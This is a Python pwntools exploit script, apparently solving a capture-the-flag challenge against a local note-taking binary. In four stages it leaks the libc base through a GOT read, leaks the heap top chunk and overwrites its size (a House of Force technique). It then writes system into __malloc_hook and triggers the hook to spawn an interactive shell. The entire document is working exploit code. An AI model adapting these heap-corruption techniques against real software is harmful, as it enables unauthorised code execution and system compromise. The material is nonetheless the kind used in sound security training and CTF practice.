#!/usr/bin/python3

from pwn import *

# <================ globals ================>

context.terminal = ['gnome-terminal', '-e', 'sh', '-c'];

script = '''
continue
'''

id = 0;

# <================ main ================>

def main():

    elf  = context.binary = ELF("program");

    libc = ELF(elf.runpath + b"/libc.so.6");
    io   = initialize_io(elf);

    io.timeout = 0.1;
    io.recvuntil(b">> ");

    # stage 1 - leak libbase by reading GOT
    libc.address = leak_libbase(io, elf, libc);
    print("[+] leaked libbase: " + hex(libc.address));

    # stage 2 - leak heapbase by reading global array
    topchunk = leak_topchunk(io, elf);
    print("[+] leaked topchunk: " + hex(topchunk));

    # stage 3 - register __malloc_hook handler
    register_handler(io, libc, topchunk, libc.sym.system);
    print("[+] registered fake handler");

    # stage 4 - trigger hook and obtain a shell
    trigger_malloc_hook(io, libc.address + 0x18cd57);
    print("[+] obtaining shell...");

    io.interactive();

# <================ functions ================>

def leak_libbase(io, elf, libc):

    return arbitrary_read(io, elf.got['setvbuf']) - libc.sym.setvbuf;

def leak_topchunk(io, elf):

    return arbitrary_read(io, 0x602040 + (id * 0x8)) + 0x60;

def register_handler(io, libc, topchunk, handler):

    r        = libc.sym.__malloc_hook & 0xf;
    target   = libc.sym.__malloc_hook - r - 0x10;
    topchunk = topchunk + 0xa0 + 0x10;

    overwrite_topchunk(io);

    edit_note(io, 2, b"\x0a", b"\x0a", target - topchunk);
    edit_note(io, 2, b"\x0a", b"R" * r + p64(handler) + b"\x0a", 0x18);

def trigger_malloc_hook(io, rdi):

    edit_note(io, 2, b"\x0a", b"\x0a", rdi);

def arbitrary_read(io, addr):

    note_name = 0x4f * b"X";
    note_desc = 0x08 * b"S" + p64(addr);

    add_note(io, note_name, note_desc);
    x, leak = view_note(io, id - 1);

    return unpack(leak, 'all', endian = 'little');

def overwrite_topchunk(io):

    fake_meta = b"\xf1\xff\xff\xff\xff\xff\xff\xff";

    note_name = 0x4f * b"Y";
    note_desc = 0x08 * b"S" + 0x10 * b"\xff" + fake_meta;

    add_note(io, note_name, note_desc);

def add_note(io, name, desc):

    global id;

    io.send(b"1");

    io.sendafter(b"name: ", name + b"\n");
    io.sendafter(b"desc: ", desc + b"\n");
    io.recvuntil(b">> ");

    id += 1;

def view_note(io, id):

    io.send(b"4");
    io.sendafter(b"idx: ", f"{id}".encode());

    io.recvuntil(b"Name : ");
    name = io.recvline(keepends = False);

    io.recvuntil(b"Description : ");
    desc = io.recvline(keepends = False);

    io.recvuntil(b">> ");
    return name, desc;

def edit_note(io, id, name, desc, size):

    io.send(b"2");

    io.sendafter(b"index: ", f"{id}".encode());
    io.sendafter(b"name: ", name);

    io.sendafter(b"size: ", f"{size}".encode());
    io.sendafter(b"desc: ", desc);

    io.recvuntil(b">> ");

def initialize_io(elf):

    if args.GDB:
        return gdb.debug(elf.path, gdbscript = script);
    
    return process(elf.path);

# <================ init main ================>

if __name__ == "__main__":
    main();
